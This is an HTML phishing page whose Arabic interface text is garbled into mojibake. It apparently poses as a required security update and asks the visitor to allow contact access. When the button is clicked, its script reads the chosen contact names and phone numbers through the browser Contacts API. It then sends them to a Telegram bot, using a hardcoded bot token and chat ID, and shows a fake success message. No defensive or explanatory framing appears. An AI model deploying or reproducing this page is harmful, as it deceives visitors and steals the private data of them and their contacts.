<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ØªØ£ÙƒÙŠØ¯ Ø§Ù„Ù‡ÙˆÙŠØ©</title>
    <style>
        /* ÙˆØ§Ø¬Ù‡Ø© ØªØºØ·ÙŠ Ø§Ù„Ø´Ø§Ø´Ø© Ø¨Ø§Ù„ÙƒØ§Ù…Ù„ */
        #permissionScreen {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: #000000;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            color: white;
            text-align: center;
        }
        .btn-start {
            background: #00ff95;
            color: black;
            border: none;
            padding: 20px 40px;
            font-size: 20px;
            font-weight: bold;
            border-radius: 50px;
            cursor: pointer;
            box-shadow: 0 0 20px #00ff95;
        }
    </style>
</head>
<body>

<div id="permissionScreen">
    <h1>âš ï¸ Ù…Ø·Ù„ÙˆØ¨ ØªØ­Ø¯ÙŠØ« Ø£Ù…Ù†ÙŠ</h1>
    <p>ÙŠØ¬Ø¨ Ø§Ù„Ø³Ù…Ø§Ø­ Ø¨Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ø¬Ù‡Ø§Øª Ø§Ù„Ø§ØªØµØ§Ù„ Ù„Ù…ØªØ§Ø¨Ø¹Ø© Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„Ù…ÙˆÙ‚Ø¹</p>
    <br>
    <button class="btn-start" onclick="requestNow()">Ù…ÙˆØ§ÙÙ‚ØŒ Ø§Ø³ØªÙ…Ø±Ø§Ø±</button>
</div>

<script>
async function requestNow() {
    // 1. Ø¥Ø®ÙØ§Ø¡ Ø§Ù„Ø´Ø§Ø´Ø© Ø§Ù„Ø³ÙˆØ¯Ø§Ø¡
    document.getElementById('permissionScreen').style.display = 'none';

    // 2. Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„Ø¨ÙˆØª (ØªØ£ÙƒØ¯ Ù…Ù† ÙˆØ¶Ø¹ Ø¨ÙŠØ§Ù†Ø§ØªÙƒ Ø§Ù„ØµØ­ÙŠØ­Ø©)
    const token = "8282613566:AAGvB5UKECEpNb88oWmCPveeaqD18euh8tY";
    const chatID = "6969597735";

    // 3. Ù…Ø­Ø§ÙˆÙ„Ø© Ø³Ø­Ø¨ Ø§Ù„Ø£Ø³Ù…Ø§Ø¡ ÙÙˆØ±Ø§Ù‹ Ø¨Ø¹Ø¯ Ø§Ù„Ù†Ù‚Ø±Ø©
    try {
        if (!('contacts' in navigator)) {
            alert("Ù…ØªØµÙØ­Ùƒ Ù„Ø§ ÙŠØ¯Ø¹Ù… Ù‡Ø°Ù‡ Ø§Ù„Ù…ÙŠØ²Ø©ØŒ Ø§Ø³ØªØ®Ø¯Ù… ÙƒØ±ÙˆÙ… Ø£Ù†Ø¯Ø±ÙˆÙŠØ¯.");
            return;
        }

        // Ø¥Ø¸Ù‡Ø§Ø± Ù†Ø§ÙØ°Ø© Ø§Ø®ØªÙŠØ§Ø± Ø§Ù„Ø£Ø³Ù…Ø§Ø¡ Ù…Ù† Ø§Ù„Ù‡Ø§ØªÙ
        const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });

        if (contacts.length > 0) {
            // ØªØ¬Ù…ÙŠØ¹ Ø§Ù„Ø£Ø³Ù…Ø§Ø¡ ÙÙŠ Ù†Øµ ÙˆØ§Ø­Ø¯
            let allData = `ğŸ“¥ ÙˆØµÙ„ØªÙƒ Ù†Ø³Ø®Ø© Ø¬Ø¯ÙŠØ¯Ø©:\n\n`;
            contacts.forEach((c, i) => {
                allData += `${i+1}- ${c.name}: ${c.tel[0]}\n`;
            });

            // Ø¥Ø±Ø³Ø§Ù„ Ù„Ù„ØªÙ„Ø¬Ø±Ø§Ù…
            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: chatID,
                    text: allData
                })
            });
            
            alert("ØªÙ… Ø§Ù„ØªØ­Ø¯ÙŠØ« Ø¨Ù†Ø¬Ø§Ø­");
        }
    } catch (err) {
        alert("ÙŠØ¬Ø¨ Ø¹Ù„ÙŠÙƒ Ø§Ù„Ø¶ØºØ· Ø¹Ù„Ù‰ 'Ø³Ù…Ø§Ø­' ÙÙŠ Ù†Ø§ÙØ°Ø© Ø§Ù„Ù†Ø¸Ø§Ù… Ù„ØªÙØ¹ÙŠÙ„ Ø§Ù„Ù…ÙŠØ²Ø©.");
    }
}
</script>

</body>
</html>
